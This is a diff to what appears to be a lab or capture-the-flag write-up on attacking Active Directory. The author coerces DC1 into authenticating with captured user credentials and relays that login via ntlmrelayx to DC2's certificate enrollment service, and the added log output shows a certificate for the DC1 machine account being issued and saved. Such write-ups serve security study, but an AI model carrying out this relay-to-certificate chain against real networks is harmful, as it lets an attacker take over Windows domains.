@@ -707,7 +707,24 @@ COERCE_PLUS 10.1.139.227    445    DC1              Exploit Success, efsrpc\EfsR
 ```
 Ill use `mike.silver` credentials on dc1 since this is what i want to coerce to dc2
 
-Ill also specify my listener to relay the auth
+Ill also specify my listener so that ntlmrelayx can relay the auth to dc2
+
+```python
+[*] (SMB): Received connection from 10.1.139.227, attacking target http://dc2.dismay.hsm
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (SMB): Authenticating connection from DISMAY/DC1$@10.1.139.227 against http://dc2.dismay.hsm SUCCEED [1]
+[*] (SMB): Received connection from 10.1.139.227, attacking target http://dc2.dismay.hsm
+[*] http://DISMAY/DC1$@dc2.dismay.hsm [1] -> Generating CSR...
+[*] http://DISMAY/DC1$@dc2.dismay.hsm [1] -> CSR generated!
+[*] http://DISMAY/DC1$@dc2.dismay.hsm [1] -> Getting certificate...
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (SMB): Authenticating connection from DISMAY/DC1$@10.1.139.227 against http://dc2.dismay.hsm SUCCEED [2]
+[*] http://DISMAY/DC1$@dc2.dismay.hsm [2] -> Skipping user DC1$ since attack was already performed
+[*] http://DISMAY/DC1$@dc2.dismay.hsm [1] -> GOT CERTIFICATE! ID 11
+[*] http://DISMAY/DC1$@dc2.dismay.hsm [1] -> Writing PKCS#12 certificate to ./DC1.pfx
+[*] http://DISMAY/DC1$@dc2.dismay.hsm [1] -> Certificate successfully written to file
+```
+After a moment of running nxc i get a certificate for dc1 back from ntlm
 
 
 
